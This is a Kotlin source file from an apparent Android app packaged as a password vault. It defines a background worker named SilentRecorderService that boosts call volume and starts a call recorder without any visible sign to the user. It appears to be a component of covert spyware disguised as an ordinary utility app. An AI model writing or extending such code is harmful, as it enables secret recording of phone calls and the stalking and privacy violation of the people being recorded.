package com.example.passwordvault.service

import android.content.Context
import android.os.Build
import androidx.annotation.RequiresApi
import androidx.work.Worker
import androidx.work.WorkerParameters
import com.example.passwordvault.util.CALL_RECORDER
import com.example.passwordvault.util.Recorder
import com.example.passwordvault.util.logger.log

private val tag = SilentRecorderService::class.java.simpleName

class SilentRecorderService(
    appContext: Context,
    workerParams: WorkerParameters
) :
    Worker(appContext, workerParams) {
    private val context = appContext

    @RequiresApi(Build.VERSION_CODES.N)
    override fun doWork(): Result {
        log(tag, "Call recorder started")

        try {
            Recorder.increaseCallVolume(context)
            Recorder.initialize(context, CALL_RECORDER)
            Recorder.prepareRecorder(context)
        } catch (e: Exception) {
            log(tag, "Exception -> ${e.printStackTrace()}")
        }

        return Result.success()
    }

    override fun onStopped() {
        log(tag, "Call recorder Stopped")
        Recorder.stopRecorder()
    }
}